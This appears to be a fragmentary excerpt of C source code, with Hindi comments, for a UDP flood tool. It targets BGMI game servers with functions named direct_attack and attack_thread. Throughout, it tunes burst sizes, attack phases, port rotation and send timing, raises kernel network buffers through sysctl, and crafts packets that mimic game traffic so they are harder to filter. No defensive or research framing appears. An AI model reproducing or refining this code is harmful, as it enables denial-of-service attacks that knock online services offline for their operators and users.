...
#define BASE_BURST_SIZE 180  // 250 से घटाया (stable के लिए)
#define MAX_BURST_SIZE 500   // 800 से घटाया
#define PHASE1_DURATION 22
#define PHASE2_DURATION 8
#define PHASE1_STRENGTH 90   // 120 से घटाया
#define PHASE3_STRENGTH 100  // 150 से घटाया
#define NORMAL_PORT_ROTATE 38   // 25 से बढ़ाया (mrx.c जैसा)
#define DIRECT_PORT_ROTATE 650  // 300 से बढ़ाया (mrx.c जैसा)
...
void optimize_kernel() {
    ...
    system("sysctl -w net.core.netdev_max_backlog=4000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='134217728 134217728 134217728' >/dev/null 2>&1");
...
void create_bgmi_packet(char *buf, int size, int pattern_type, int thread_id, int seq, unsigned int seed) {
    ...
    switch(enhanced_pattern) {
        case 0: {
            ...
            unsigned int timestamp = (unsigned int)time(NULL) + thread_id + seq;
        ...
        case 2: {
            ...
            if (size >= 14) {
                ...
                int timestamp = ((unsigned int)time(NULL) * 1000) + thread_id * 7 + seq * 13;
...
void *direct_attack(void *arg) {
    ...
    unsigned int seed = (thread_idx * 1234567) ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
    int current_phase = 1;
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            if (current_phase == 3 && packets_sent == burst_size) {
                if (burst_size < MAX_BURST_SIZE) burst_size += 10;
            }
        }
...
void *attack_thread(void *arg) {
    ...
    int port_change = 0;
    unsigned int seed = (tid * 7654321) ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
    int current_phase = 1;
    int burst_size = (BASE_BURST_SIZE * PHASE1_STRENGTH) / 100;
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (current_phase == 3 && packets_sent == burst_size) {
            if (burst_size < MAX_BURST_SIZE) burst_size += 5;
        }
        ...
        // STABLE TIMING: Fixed 677μs like mrx.c
        if (elapsed_us < 677) {
            usleep(677 - elapsed_us);
        }
        gettimeofday(&last_send_time, NULL);
